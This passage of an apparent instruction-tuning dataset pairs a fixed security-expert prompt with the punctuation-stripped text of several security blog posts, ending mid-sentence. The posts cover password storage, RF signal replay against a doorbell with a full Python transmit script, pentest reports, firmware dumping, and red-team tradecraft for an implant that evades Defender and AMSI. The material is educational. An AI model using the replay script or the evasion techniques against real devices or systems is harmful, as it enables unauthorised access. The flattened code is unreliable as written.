any of these keys for your own PPM Make up your own key so it will be completely secret Example Keys 6PackOfCola 11 characters 3 upper case 7 lower case 1 numeral XmasTr33 8 characters 2 upper case 4 lower case 2 numerals BillAndTed19 12 characters 3 upper case 7 lower case 2 numerals Step 2 Storing an account in your PPM Once you've selected your key you're ready to begin recording account details in your PPM How you record the information is completely up to you At a minimum each entry should probably include The website name or URL e.g Amazon Google.com The email address associated with the account The username used to login to your account if it is different than your email address The unique bit of the password to the account You might also want to include the phone number associated with the account or other information you provided when you signed up that you might need later However don't include the answers to your security questions in your PPM I'll discuss how to store those securely later in the article Here's an example of how an entry for Amazon might look in my PPM Website Amazon.comEmail address michael example.comUnique bit ______________ If you're following along with these instructions go ahead and fill in all the information for one of your accounts in your PPM You won't be able to fill in the unique bit yet you'll do that in the next step Step 3 Generating the unique bit The last piece of information to fill in from the previous step is the unique bit Each account should have its own unique bit since that's what makes the password for each account unique To generate the unique bit create another password that's at least 8 characters long longer is even better and includes at least one of each character type upper case lower case numerals and special characters If you visit a website that doesn't allow special characters you can create a unique bit using only letters and numbers but for maximum security include special characters whenever they're allowed Also remember that spaces are often considered special characters and are easy to include between words in the unique bit Here's an example of the Amazon entry in my PPM after creating a unique bit Website Amazon.comEmail address michael example.comUnique bit 8 Fluffy Clouds TIP You might notice that I use words in my key and unique bit examples instead of scrambling up a bunch of letters I choose random words instead of individual random letters because words are so much easier to read and to type when I'm entering my password Copying 8 Fluffy Clouds from my PPM is much easier than copying 8 uyflFf uldCso even though they're both the same length and contain all of the same characters Since all of your passwords will be a minimum of 16 characters in length at least 8 in the unique bit and at least 8 in the key your passwords will be plenty strong if they contain random words instead of random letters And they'll be way easier to type Step 4 Retrieving a password from your PPM Retrieving a password from an entry in your PPM is very easy When you enter your password into the website to login first type the account's unique bit written in your PPM and then type your memorized key For example if the unique bit for the account I was logging into was 8 Fluffy Clouds and my key was 6PackOfCola then the password to my account would be 8 Fluffy Clouds6PackOfCola Together the unique bit and the key give my account a password that is different than all of my other passwords The password is also 26 characters long and contains all four types of characters making it extremely difficult for an attacker to guess Example of Logging in to Amazon by Combining the Unique Bit and Key Backups and Disaster Recovery Because the Paper Password Manager exists on paper it's easy to create backups just by making a copy with a copier or multi-function printer When backing up the key the key should be written down separately and stored in a secure location away from the PPM such as a safe deposit box A backup plan for the PPM might look something like this Paper Password Manager Primary copy Carried in a pocket for daily use Paper Password Manager Backup copy Backup created with a copier every three months Backup copy stored at home in a fireproof box for easy access Old backup copies shredded or otherwise securely disposed of when new backups are created Key Written copy of the key stored in safe deposit box Instructions for using the PPM might also be included if the key should ever need to be used by a family member Answers to security questions Answers to security questions stored in safe deposit box Since answers to security questions can be used to reset passwords on accounts they should not be stored in or with the PPM Instead answers to security questions should be stored in a separate location such as the safe deposit box where the PPM key is stored Other Tips Here are some other tips to consider when using the PPM Underline numerals present in usernames or unique bits to keep them from being confused with letters That way you won't confuse numbers like 0 and 5 with letters like O and S Similarly you might also choose to mark spaces in the unique bits with a character or symbol not present on your keyboard as in Select keys and unique bits that are easy to read and to type For example it is usually easier to read and type a password that contains a few randomly selected words than one in which each individual letter has been chosen at random Don't follow any sequence or pattern when selecting unique bits for your accounts If the unique bit for your Amazon account is Red2001 and the unique bit for your Gmail account is Blue2019 an attacker who compromises those passwords could start to make reasonable guesses about what the unique bit for other accounts might be For extra security consider creating a separate PPM for high-security web sites like bank accounts Each PPM should have its own unique key if you decide to go this route Putting it into action I hope you found this article valuable and that for you or someone you know it makes securing your online accounts a little less daunting Like any new skill incorporating the Paper Password Manager into your routine may take some practice To make it a little easier to remember how it works I created a one-page reference sheet that you can download and optionally print from the link below Download the Paper Password Manager Reference Sheet"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To Replay RF Signals Using SDR</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Ray Felch, Raymond Felch, SDR, Software Defined Radio</taxonomies>\n<creation_date>Thu, 23 Jan 2020 17:23:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch SOFTWARE DEFINED RADIO RF Signal Replay Techniques Disclaimer Be sure to use a faraday bag or cage before transmitting any data so you don't accidentally break any laws by illegally transmitting on regulated frequencies Additionally intercepting and decrypting someone else's data is illegal so be careful when researching your traffic Preface Recently I was invited to collaborate with a few of my colleagues many thanks to BB King for bringing me into his project regarding the troubleshooting of an RF signal replay lab Although I owned an inexpensive 20 RTL dongle and the higher-priced 350 HackRF One device I did not possess the Yardstick One 100 dongle being used in BB King's lab Furthermore I was not familiar with a few of the tools RfCat and scripts unique to the Yardstick One dongle As you might guess I immediately ordered the Yardstick One and also purchased an inexpensive 12 wireless doorbell at a local retail store While waiting for the delivery of the Yardstick I decided to power up my HackRF One and attempt to capture the doorbell remote's RF signal and replay it using the HackRF Realizing that there are a few different ways to perform RF Signal replay attacks I decided to document my findings so that others might benefit from what I discovered along the way Hopefully armed with this information the methods can be chosen based upon your needs and the cost complexity and versatility of the devices and tools available SDR USB Devices RTL-SDR Inexpensive 20 Receive only Frequency range 500KHz to 1.75GHz Yardstick One Moderately priced 100 Receive and Transmit Frequency range 300-348MHz 391-464MHz and 782-928MHz Half-Duplex HackRF One Higher priced 350 Receive and Transmit Frequency range 1 MHz and 6 GHz Half-Duplex BladeRF Higher priced 420 Receive and Transmit Frequency range 47MHz to 6GHz 61.44MHz sampling rate and 2 2 MIMO streaming Full Duplex RF Signal Replay examples using a wireless doorbell FCC search ccid.io of the device FCC Identifier results The RTL-SDR RF Signal receive and capture using Gqrx Note RTL-SDR can not transmit After adjusting the center frequency for optimum gain and clarity 433.89MHz we can click the REC radio button and then press the peripheral remote button and ultimately capture the RF signal burst to a file Obviously we can not transmit this signal due to the limitations of the RTL-SDR dongle but the captured file could be transmitted by the Yardstick One or the HackRF providing we convert the .wav file to a raw file that these devices can recognize For example the HackRF requires an 8 bit signed IQ raw file with no header information In addition to GQRX there many other SDR GUI applications available such as SDRSharp SIGINTOS etc for more information see my BHIS blog Introduction to Software Defined Radio and GSM LTE The HackRF One RF Signal replays using simple command lines Undoubtedly one of the quickest ways to replay an RF signal when the signal center frequency is known is using the HackRF tool hackrf_transfer By providing the required parameters the HackRF can capture the desired transmission while pressing the peripherals remote button and then save the raw data to a file Additionally the HackRF can replay transmit the raw RF signal in the saved file and thereby invoke the desired peripheral activity without the use of the physical remote Unfortunately although this method is quick and efficient it is done 'blindly in that little information is known about the signal It does what it is intended to do but falls short with regard to exposing possible attack vectors or vulnerabilities The HackRF One RF Signal replays using GNURADIO flowgraphs Although not the quickest method of RF signal replays the HackRF can also be used in conjunction with GNURADIO flow-graphs to capture save and replay RF signals The learning curve to understanding GNURADIO can be quite extensive however with this complexity comes great power and versatility The following screenshots show a previous signal replay project vehicle FOB replay that I conducted using GNURADIO flow-graphs for more detailed information see my BHIS blog GNU RADIO PRIMER As can be seen the center frequency in this project was 315MHz but the process is the same The following shows a File Sink block which saves the captured signal The following shows the replay flow-graph greyed out blocks are disabled The Yardstick One RF Signal replays using RfCat Install RFCat and Dependencies libusb pyusb git clone ithub.com atlas0fd00m rfcat.git cd rfcat sudo python setup.py install cd git clone ithub.com walac pyusb.git cd pyusb sudo python setup.py install easy install pip pip install libusb Plug in your device and run the following to verify rfcat -r Verify the installation and dongle detection Loading the saved .wav file which we captured using GQRX into Audacity we can quickly identify the transmitted on-off keyed data burst Highlighting the transmitted data burst and zooming in we can see a repeating pattern of smaller bursts Zooming in on any of the repeating smaller bursts allows us to identify the actual OOK on-off keying PWM pulse width modulated data Short pulses are considered Mark 1 and wider pulses are considered Space 0 Decoding the waveform pulses we get the following digital footprint Binary bit-stream In order to reproduce the waveform for replay on the Yardstick each value of the digital footprint pulses need to be encoded using the following bit table Footprint value 0 Encoded bits 1110 Footprint value 1 Encoded bits 1000 Encoded bit-stream 11101000 11101000 11101110 10001110 11101110 10001000 10001110 10001110 10001110 11101000 11101000 10001000 10000000 In order to replay this bit-stream using the Yardstick One we need to convert this binary data into hex This results in the following hex values E8 E8 EE 8E EE 88 8E 8E 8E E8 E8 88 80 We then need to precede each hex value with x Yardstick Replay String xE8 xE8 xEE x8E xEE x88 x8E x8E x8E xE8 xE8 x88 x80 padded with zeros xE8 xE8 xEE x8E xEE x88 x8E x8E x8E xE8 xE8 x88 x80 x00 x00 x00 x00 x00 x00 With the Yardstick One installed we can now run a RfCat instance sudo python doorbell.py my script doorbell.py Note Baud rate is approximated using the equation baud rate reciprocal 1 t where time is the period of 1 bit Based on the following screenshot we can see a 3-bit pulse is approximately 630 microseconds in length dividing by 3 yields a time of 210 microseconds per bit Using the time of the shortest pulse 210uS and taking it's reciprocal gives us the approximate baud rate of 4800 Executing the doorbell.py script successfully resulted in ringing the doorbell Additional Information RFCat as a Spectrum Analyzer Install Spectrum Analyzer prerequisites sudo pip install PySide2 sudo apt-get install ipython Executing d.specan 433920000 and pressing remote button Final Notes In an effort to automate the entire replay process rather than manually entering the hex string in interactive mode I wrote a short python script to reproduce the digital footprint that was captured by GQRX and which was later analyzed in Audacity As was mentioned earlier encoding of the digital footprint was based solely on the following bit table Footprint value 0 Encoded bits 1110 Footprint value 1 Encoded bits 1000 However it needs to be mentioned that although I was able to successfully ring the bell my colleague was unsuccessful running the same script on his hardware The difference between my captured digital footprint and his is displayed below Notice that my footprint begins with a Space encoded 1110 However BB King's footprint begins with a Mark and by looking at the pulse it should have been encoded as 0001 Unfortunately I did not account for that scenario and my script therefore encoded it as 1000 resulting in a fail for BB King's testing To correct for this scenario I made a modification to the script that checks the first pulse of the digital footprint and encodes the entire footprint according to the following bit-table First pulse of footprint Space '0 Footprint value 0 Encoded bits 1110 Footprint value 1 Encoded bits 1000 First pulse of footprint Mark '1 Footprint value 0 Encoded bits 0111 Footprint value 1 Encoded bits 0001 Python code Understand that I make no claims on the elegance of my python coding and admittedly threw this together rather quickly at the expense of efficiency and technique Also as there is presently no support for the rflib module in python3 so I opted to code it in python 2.7 Inasmuch you are welcome to use and edit the code to your liking however keep in mind that you are also responsible for not breaking any laws by illegally transmitting on regulated frequencies import sys import time from rflib import from struct import User defined parameters _digital_footprint 0101001000111010100101111 My footprint short transition from 'space to mark _digital_footprint 11000111010000 BB King's footprint long transition from 'space to mark _frequency 433890000 _baudrate 4800 _modulation MOD_ASK_OOK Modulation Type not alterable in this version _mult 3 Number of times to transmit RF signal _pad_bytes 3 Number of zero bytes for trailing padding _method 1 Time period of 'valley gap when transitioning from space to mark in footprint Short period 1 bit time period _method 0 Long period 3 bit time period _method 1 Configure rf_cat d RfCat d.setFreq _frequency d.setMdmModulation MOD_ASK_OOK d.setMdmDRate _baudrate print SIGNAL INFORMATION print print Frequency _frequency print Baud rate _baudrate print ModulationType _modulation print Repeat transmission count _mult print Digital footprint _digital_footprint mark_space str _digital_footprint xmt_stream Scan each digital footprint bit pulse and convert it to the appropriate 4-bit value Mark 1 short pulse and Space 0 long pulse mark_space str _digital_footprint xmt_stream if _method 0 transitions from space to mark in footprint are short 1 bit time period for i in mark_space if i 0 Space _pulse 1110 if i 1 Mark _pulse 1000 xmt_stream xmt_stream _pulse if _method 1 transitions from space to mark in footprint are long 3 bit time period for i in mark_space if i 0 Space _pulse 0111 if i 1 Mark _pulse 0001 xmt_stream xmt_stream _pulse If length of digital footprint is odd then pad it with 0000 to make it 8 bits if len _digital_footprint 2 0 xmt_stream xmt_stream 0000 Pad zeroes for gap length between transmissions _padding for i in range 0 _pad_bytes xmt_stream xmt_stream 00000000 _padding _padding 00000000 print Trailing padding _padding print RF transmit binary stream xmt_stream Convert binary transmit stream to hex equivalent hex_xmt_stream str 08X int xmt_stream 2 print RF transmit hex stream hex_xmt_stream mod_xmt_stream for i in xrange 0 len hex_xmt_stream 2 ch x mod_xmt_stream mod_xmt_stream ch hex_xmt_stream i i 2 print Modified RF hex stream mod_xmt_stream -------------------Send Transmission print Starting transmission hex_data bytearray.fromhex hex_xmt_stream d.RFxmit hex_data repeat _mult d.setModeIDLE print print Transmission Complete Follow-up testing In my attempt to try and understand why I needed to have two separate bit tables when encoding for two different pieces of hardware just because one footprint started with a space and one started with mark I decided to look into it further I ran a test using my known working digital footprint but with BB King's encoding on the assumption that maybe it would work and I could eliminate the need for two bit-tables It did not work so I did a deep dive into why not After careful attention to detail it became clear where the problem was The issue was not that my footprint started with a space and his with a mark the difference was in the period of time transitioning from a space to mark Compare the two digital footprints which I posted earlier Analyzing my footprint the period of time when transitioning from space to mark is 1 bit in length where BB King's space to mark transitioning period of time is 3 bits in length Based on this knowledge I again modified my python code to account for this difference when choosing which bit table to use No longer concerned with whether a footprint begins with a space or mark I instead looked at the transitioning period and used this information to choose the appropriate bit table Success Closing thoughts Working with the Yardstick for the first time proved to be a very rewarding experience for me and having the opportunity to collaborate with BB King while we simultaneously worked on our own unique hardware was hugely beneficial to me It kept me focused and on track and highly motivated as well as exposed me to variations that could occur in similar yet different test labs Also in my humble opinion I feel that Michael Ossmann's Yardstick One Great Scott Gadgets is an awesome tool that's relatively inexpensive easy to interact with yet versatile enough to automate if the need arises It's frequency limitations under 1GHz is of little concern when capturing and replaying rolling or fixed code devices like vehicle fobs garage door openers wireless doorbells security devices or just about any wireless RF signal in that frequency range"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What You Should Actually Learn From a Pentest Report</title>\n<taxonomies>Informational, InfoSec 101, dakota nelson, pentest reports, Pentesting</taxonomies>\n<creation_date>Mon, 27 Jan 2020 15:13:05 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson Unknown Unknowns So you've been pentested Congrats It might not feel like it but this will eventually leave you more confident about your security not less The real question is why might it not feel like it Pentest findings can be broken down many ways of course the obvious one being by severity but I would like to propose another category information value or a more straightforward term surprise When you first read your pentest report there's a good chance there will be things on there you didn't expect vulnerabilities or misconfigurations that you had no idea were such a problem or even existed at all This is surprising and your brain doesn't always like surprise but in this case surprise is good Surprise is the process of as Rumsfeld would say turning unknowns into knowns There are still different amounts of surprise though and the information value that I'm proposing can also be looked at as which box in this Rumsfeld Matrix the finding lived in before you learned about it on the report The first option is that you already had some sense of these vulnerabilities Say for instance that you had a box externally facing that you had never scanned but suspected might be insecure Finding vulnerabilities on this box might move the box from a known unknown to a known known This is useful But it's still something that you likely could have done on your own with a vulnerability scanner or the like since you knew where to look A known unknown is not usually very surprising when it becomes a known known On the other hand there are the really surprising findings the ones you didn't expect to crop up This I think is where the real value of a pentest comes from Getting a report back that says all of your Windows XP boxes are unsupported is probably not terribly useful to you because it's no surprise to learn that XP is unsupported at least I hope not and there's likely some business reason those machines are still up The report can be useful when briefing management to try to convince them to finally get rid of the XP machines but that value is generally limited On the other hand a report that says we were able to pivot using RDP to a box you didn't know existed then elevate from there to domain administrator using mimikatz might be a genuine shock and therefore extremely valuable This isn't to say that only extremely complex findings live as unknown unknowns this all depends on what the blue team knows going into the test For some companies finding out that your boxes are vulnerable because they're unpatched might be fairly surprising while others might have their network so well locked down that only extremely advanced techniques come as a surprise to them This is ok Every company is in a different place and wherever you start as long as the test moves things into the known knowns box it reduces your risk at the end of the day When you're thinking about getting a test or evaluating the results spend a minute or two thinking about what you know that you don't know and how to find out what you don't know you don't know with the help of the pentest Giving your testers a narrow scope is well and good for avoiding surprise but even though it's unpleasant maybe surprise isn't so bad after all"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Dumping Firmware With the CH341a Programmer</title>\n<taxonomies>Hardware Hacking, How-To, Informational, AsProgrammer, Rick Wisser</taxonomies>\n<creation_date>Wed, 29 Jan 2020 13:10:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Rick Wisser Note This blog will also be a lab for any of the upcoming Wild West Hackin Fest Conferences During a recent engagement I came across an issue The issue I encountered was that the SPI chip I was trying to dump the firmware off of was a 1.8v chip This would not have been a problem but both the shikra and bus pirate are rated for 3.3v chips I considered creating a voltage divider to step the voltage down but after a little Googling I came across the CH341a with the 1.8v adapter I decided to order it with one-day shipping After I worked with it and was able to successfully dump the firmware from the 1.8v IC without having to remove the SPI chip from the circuit board I decided to write a blog about it This blog is targeted for all audiences It might be a little too step-by-step for intermediate or experienced people who have dumped firmware with other tools but I wanted to include the beginner as well because we all started somewhere right Below is a picture of the CH341a package that I got I will include links at the end of this blog on which items I bought or reference CH341a Package Contents The CH341a is very easy to set-up Usually I use a Linux variant Operating System for conducting any testing However from previous experience I know that the AsProgrammer works better on a Windows PC All you need are the drivers and the AsProgrammer software which can be found in the following links CH341-Windows-SPI-I2C-Driver SDK-library and CH341-Windows-Serial-Driver SDK-library directories at ithub.com boseji CH341-Store AsProgrammer software ithub.com nofeletru UsbAsp-flash releases After downloading the software and installing it on my Windows laptop it was time to pick a target I went into my collection of garage sale electronics and found a Netgear WNDR3700 router that would do the trick After cracking open the case and conducting reconnaissance on the chips for the device I found a target SPI chip The following is a picture of the board with the SPI chip identified Netgear WNDR3700 Circuit Board with SPI Chip Identified As with any reconnaissance you will want to find more information Therefore I grabbed the datasheet for the MX25L6445E SPI chip and looked at the pin diagram and identified the type of package that is installed on the WNDR3700 circuit board Datasheet Pin Configuration and Description Examining the datasheet I noticed that this particular chip has a VCC of 3.3v and the actual package type on the board is a 16 pin chip Due to this information we know that it is not necessary to use the 1.8v adapter But it appears that we might have an issue with the 16 pin chip package note that the middle 8 pins are not used The CH341a only comes with an 8 pin chip clip and header I could solder wires onto the functioning pins of the MX25L6445E and interface it to the CH341a Zero Insertion Force ZIF socket but since I could use a 16 pin chip clip for future engagements I decided to purchase one After a quick internet search I chose a 16 pin chip clip that included headers already soldered for interfacing with the ZIF socket of the CH341a I will place the link for the 16 pin chip clip at the bottom of this blog along with a link for the CH341a programmer The headers that were provided with the 16 pin chip clip included an 8 to 16 pin as well as a 16 to 16 pin header I also ohmed out the 8 to 16 pin header and found that it had the correct traces in place to interface directly with the 16 pin MX25L6445E chip and the CH341a ZIF socket Here is a picture of the chip clip with the headers 16 Pin Chip Clip with Headers The connections were easy to make since everything has either pin markings silkscreen prints or some type of indicator to reference pin 1 For instance the chip is marked with a divot in the corner where pin 1 is The chip clip has one of its strands of cable red to indicate pin 1 and the interface board has numbers silk-screened on the board to indicate the pins Finally the CH341a has silkscreen as well to indicate where pin one goes for either a 24xxx or 25xxx chip type Below are images with descriptions showing the pin and silk marking indicators Pin 1 Indicator for MX25L6445E Chip Silk Screen on CH341a for Pin Chip Reference The CH341a silkscreen has indicators for 25xx and 24xx with little half circles to the right of them This half-circle indicates that pin 1 is next to the half-circle and would be the top right corner The ZIF socket has 16 pins so it is divided in half with the right side for 24xx chips and the left side for 25xx chips In this situation we will be using the left side of the ZIF socket since our chip is an MX25L6445E chip Pin 1 Designators on Header Board and Chip Clip Cable The above image shows the chip clip cable attached to the header board with the pin 1 designators lined up Next we will hook the chip clip to the chip with the red pin 1 indicator aligned with the pin 1 designator of the MX25L6445E chip as shown below Chip Clip Installed on MX25L6445E Chip Finally we install the header with the chip clip cable onto the CH341a ZIF socket as shown below Aligning Header Pins with CH341a ZIF Socket Now with everything connected we can dump the firmware from our MX25L6445E chip We connect the CH341a to the USB port on our Windows PC and open up AsProgrammer First we have to select the CH341a as the hardware device in the Hardware menu IMPORTANT NOTE The CH341a supplies the power to the board so you do not need to plug in the WNDR3700 into the wall If you do so you may damage your CH341a Choosing Hardware Device in AsProgrammer The next thing you need to do is select the type of SPI chip you will be using Select IC from the main menu and then SPI followed by the vendor and then the IC In this case we want the MACRONIX MX25L6445E chip Selecting the IC in AsProgrammer Once the chip is selected it will be shown in the top menu screen of the AsProgrammer The Size Page and SPI commands will also auto-populate so you should not have to mess with them You also want to confirm that the SPI radio button is selected Below is a screenshot of how AsProgrammer should be set-up AsProgrammer Configuration After Choosing IC Once everything looks good you will click the box with the green arrow coming out of it to read the contents of the chip Once it is done you can also save it with the floppy disc icon This particular chip took 1.5 minutes to read the contents which can be shown below in the screenshot below after reading the contents of the MX25L6445E Chip Successful Read of MX25L6445E IC Now that we have our firmware dumped we can evaluate it for anything of interest In this case I used the strings or strings.exe You will have to download it for the Windows OS to search for password and SSID as shown below Using Strings to Search for password and SSID As you observe you can see that this particular router looks to have been reset before it was taken out of commission and sold since it has what looks like default values The best thing about the CH341a is that with other hardware such as the Bus Pirate and Shikra I have found that I need to remove the SPI chip from the board to interact with it due to other circuits interfering with the targeted SPI chip However with the CH341a I can just place a chip clip on the chip and dump the firmware without worrying about damaging the component by desoldering and soldering it on a breakaway board If you enjoyed this blog post and would like to get your hands dirty come and join us at one of our Wild West Hackin Fest conferences I will have this and many other labs available for attendees to play with Below are the links for the items that I purchased in the blog post Amazon CH341a Pro with 1.8v add on ww.amazon.com Organizer-EEPROM-CH341A-Adapter-Programmer dp B07V2M5MVH ref sr_1_1?keywords ch341a qid 1579295338 s electronics sr 1-1 Amazon link for the 16 pin chip clip ww.amazon.com WINGONEER-SOIC16-circuit-programming-adapter dp B01CYA9BTY ref pd_sbs_147_20?_encoding UTF8 pd_rd_i B01CYA9BTY pd_rd_r bcbc95e8-fcd8-4012-a17a-5e15d8a7da7b pd_rd_w 4xhD3 pd_rd_wg BUd6J pf_rd_p 670e3530-913b-43e2-8005-da937e9a4fe8 pf_rd_r AE4216TVMK66NZAYCY34 psc 1 refRID AE4216TVMK66NZAYCY34"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Red Teamer's Cookbook: BYOI (Bring Your Own Interpreter)</title>\n<taxonomies>How-To, Informational, Red Team, BYOI, Marcello Salvati, Red Team</taxonomies>\n<creation_date>Mon, 03 Feb 2020 18:48:20 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Marcello Salvati This fairly lengthy blog post aims at providing Red Team Operators ideas on how to incorporate BYOI tradecraft into their own custom tooling and get those creative malware development juices flowing This blog post can also serve as a light introduction to .NET and how to write basic C2 so there's hopefully going to be something here for everybody regardless of your skill level We're going to start from scratch and develop a bare-bones PowerShell implant which will utilize the BYOI concept to bypass Defender AMSI on the latest build of Windows 10 Along the way I'll also be explaining some core concepts underpinning BYOI The talks tools code that I've released e.g SILENTTRINITY and the proof-of-concept examples in the OffensiveDLR repository were somewhat successful I think in bringing to the attention of the community some of the main benefits of the BYOI concept but I definitely can do a better job in providing some examples of tradecraft that Operators can use in their day to day engagements and incorporate into their own tooling without having to use the stuff I've published on Github I've also been shamelessly talking about BYOI payloads tradecraft for the past year or so at various conferences As my knowledge of .NET development tradecraft grew and shifted over time I've tried to keep updating the talk to reflect the new things that I've learned and correct inaccuracies of previous versions of the talk Because of this especially if you're not familiar with the concept behind BYOI I would highly recommend watching the talk I gave at BSides Puerto Rico 2019 as it's the most up-to-date version At of the time of writing however it seems like the recordings for the con haven't been released yet the slides for the talk are on Github here so in absence of that one I'd recommend watching the one I gave at Derbycon 2019 While there are a few things that I now know are incorrect and definitely others that I could have explained better it'll suffice and get you caught up on the core concept or you can just read the next sections of this blogpost ww.youtube.com watch?v o6m6_TncrcI Before we dive straight into the code let's take a minute to go over some key .NET and BYOI takeaways and talk about why I find this type of tradecraft to be useful and elegant from an offensive perspective .NET Key Concepts Readers already familiar with .NET can probably skip this section I thought I'd add this for the sake of completeness There are a ton of articles on the intertubes including the official Microsoft docs that attempt to explain what .NET is Personally I find that most of them either aren't meant for people who have never developed in .NET before or they're so vague that the explanation becomes meaningless This didn't make things simple for me when I first embarked on trying to write C coming from Python and having no formal programming background this truly was a whole new world The following is my humble attempt at explaining what .NET is .NET is a language independent development platform comprised of a set of tools infrastructure libraries that enables you to create cross-platform applications mic drop let the hate mail commence I would like to point out one key thing about that sentence especially in the context of this blog post there is no mention about what programming language the platform actually uses A lot of people tend to associate a specific programming language with .NET the most common one being C However C is just the de-facto language for interacting with the platform and not the platform itself Parts of the infrastructure and tooling that .NET provides allows you to write your own programming language to interact with it This is an extremely important thing to understand .NET is language independent it's not tied to a specific programming language There are also various implementations flavors if you will of .NET this is a common pain point for a lot of .NET newbies The most common flavors are .NET Framework .NET Core The .NET Framework is the original implementation of .NET and has been around forever this particular implementation is extremely specific to Windows and tightly integrated within the OS itself An important thing to mention when I talk about .NET throughout the rest of this blog post I'm referring to this particular implementation unless I explicitly state otherwise This is because we're going to be building implants specifically for Windows and using languages targeting the .NET Framework .NET Core is the newest implementation and the future of the .NET platform itself The .NET Framework will be replaced by .NET Core in the near future Unlike the .NET Framework .NET Core is truly cross-platform if you wanted to build cross-platform applications you'd target .NET Core We also need to talk about .NET Assemblies as they're a fundamental part of the development platform .NET Assemblies are a single unit of execution that all .NET languages can interpret and execute By compiling any .NET language you wind up with a .NET Assembly in the form of an executable or DLL A few key points about .NET Assemblies The .NET Assembly format is different than .exe's or .dll's generated via un-managed languages e.g C C They can be executed by any .NET language including third-party languages They can be loaded reflectively by calling Assembly.Load In essence .NET natively supports reflective PE DLL injection by virtue of the Assembly.Load function We will be using this function a lot in the embedding process .NET Framework version 4.8 brought AMSI scanning for .NET Assemblies So now whenever you call the Assembly.Load function that assembly will get passed to AMSI Defender for inspection BYOI Key Concepts The Offsec tooling migration from PowerShell to C brought about some operational disadvantages The biggest one in my view being that now all your tools payloads implants need to be compiled This might not sound like a big deal but in the long run this can be a huge time sink and make things very cumbersome during a Red Team Operation Don't get me wrong C compilation can be completely automated using CI CD pipelines see Dominic's amazing Offensive Development How To DevOps Your Red Team talk or using the Roslyn compiler which is what Covenant uses in order to deal with all the necessary compilation however these two approaches still require some pretty heavy overhead in terms of setup boiler-plate code and or requirements They're just not as flexible simple and straightforward as PowerShell tradecraft used to be or really any tradecraft using a scripting language What I wanted was a way to shift the paradigm back to PowerShell style tradecraft just host some source code server-side throw it at a compromised endpoint and dynamically evaluate execute it preferably in memory which is exactly what PowerShell Empire did only without actually using PowerShell because of all the protections in place while still being able to access those sweet .NET Framework APIs Seems like a tall order Turns out not really Previously we talked about how the .NET platform is language independent and provides infrastructure to build your own programming language in order to interact with it Because of this there are many .NET languages some officially supported by Microsoft and others built by third parties A subset of these are scripting languages and don't need to be compiled at least on the surface Additionally one of the consequences of all of these languages being built on the same underlying platform is that they're all interoperable with each other which also means they expose APIs provide extremely easy ways of embedding or hosting a language within another .NET language This is the main concept that underpins BYOI tradecraft we can use third-party .NET scripting languages the same way we've been using PowerShell all these years All we have to do is host embed one in a .NET language which is present by default in Windows such as C or even PowerShell and bam We're back to the good ol days of PowerShell style tradecraft One thing I'd like to underline this isn't by any means a novel concept as a matter of fact you've probably used tools that do this without even knowing it p0wnedshell PowerLine and NPS all host embed the PowerShell Runtime within a C binary in order to execute PowerShell code without going through the main PowerShell executable There are also tools that do the reverse and embed C within PowerShell What we're going to be doing is embedding third-party scripting languages in this case Boolang within PowerShell Each one of these third-party languages comes with its own unique set of tradecraft and OPSEC advantages .NET Scripting Languages When I first started researching this the first .NET scripting language I tried was IronPython I soon came to realize that from an offsec standpoint it wasn't the most practical for a number of reasons first and foremost being that it didn't natively support PInvoke the ability to call unmanaged Windows APIs from a .NET language you had to use a module in its standard library implementation which breaks if you call it within an IronPython engine running in memory This led me down a very long Googling session to try and find a .NET scripting language that supported PInvoke natively and was able to use it within an in-memory engine runtime compiler After a while I stumbled across this wiki page in the Boo repository on Github At this point my first question was What the hell is Boo As it says on in etc Boo is an object-oriented statically typed programming language for the .NET and Mono runtimes with a Python inspired syntax and a special focus on language and compiler extensibility Source ithub.com boo-lang boo wiki I was later to find out from an attendee of my DefCon Demo Labs presentation that Boolang was initially created as a scripting language for the Unity gaming engine The more you know Boo is literally perfect from a weaponization standpoint it supports PInvoke natively exposes hosting APIs to embed it in other languages and compiles directly in memory Before I found Boo I stumbled across a bunch of other languages Here's a full list of the ones I thought were particularly interesting from a weaponization standpoint there are many others Boolang ClearScript SSharp Dotnet-webassembly Jint Out of all these ClearScript is also very interesting and worth mentioning as it's an official Microsoft project It exposes a Jscript VBscript implementation you can embed Additionally it allows you to expose the .NET CLR to Jscript VBScript Meaning you can call .NET APIs from ClearScript's Jscript VBScript engine For an example of this you can take a look at the Invoke-ClearScript.ps1 script from the OffensiveDLR repository this script embeds the ClearScript 